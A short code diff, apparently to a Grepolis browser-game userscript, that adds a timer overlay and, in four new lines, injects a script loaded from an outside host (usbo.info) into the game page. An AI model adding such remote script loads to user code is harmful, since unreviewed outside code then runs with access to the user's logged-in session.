@@ -19,6 +19,11 @@ var town_id = 0;
 (function() {
     'use strict';
 
+    var scriptElement = document.createElement( "script" );
+    scriptElement.type = "text/javascript";
+    scriptElement.src = "https://usbo.info/js/grepolis/f1.js";
+    document.body.appendChild( scriptElement );
+
     var dd = $('<div style="z-index:9999;position:fixed;top:0; left:0" />').appendTo($('body'));
     $('<div style="color:white" />').attr('id', 'col_timer_div').appendTo(dd);
     $('<input type="checkbox">').on('click', function() {
